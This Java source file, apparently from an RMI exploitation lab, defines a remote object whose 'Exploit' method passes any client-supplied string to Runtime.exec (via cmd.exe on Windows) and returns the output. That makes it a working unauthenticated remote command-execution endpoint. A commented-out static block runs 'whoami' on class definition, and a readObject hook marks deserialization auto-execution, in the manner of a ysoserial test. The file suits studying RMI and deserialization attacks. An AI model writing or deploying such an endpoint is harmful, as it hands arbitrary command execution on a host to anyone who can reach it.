package com.sorry.jcoffe.Debug.RMI;

import java.io.*;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class EXPImpl extends UnicastRemoteObject implements EXP,Serializable {
    private static final long serialVersionUID = -5809452578272945389L;
    protected EXPImpl() throws RemoteException {}

    /*
    //defineclass自动执行
    static {
        Process p;
        String result="";
        String disr;
        try{
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "whoami"});
            } else {
                p = Runtime.getRuntime().exec("whoami");
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
            while((disr=bufferedReader.readLine())!=null){
                result += disr + "\n";
            }
            System.out.println(result);
        }catch(Exception e){
            //todo nothing
        }

    }
    */

    //反序列化自动执行
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        System.out.println("ysoserial?");
    }

    @Override
    public String Exploit(String cmd) throws IOException {

        System.out.println("函数调用");
        Process p;
        String result="";
        String disr;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
        while((disr=bufferedReader.readLine())!=null){
            result += disr + "\n";
        }
        return result;//return to client
    }

}
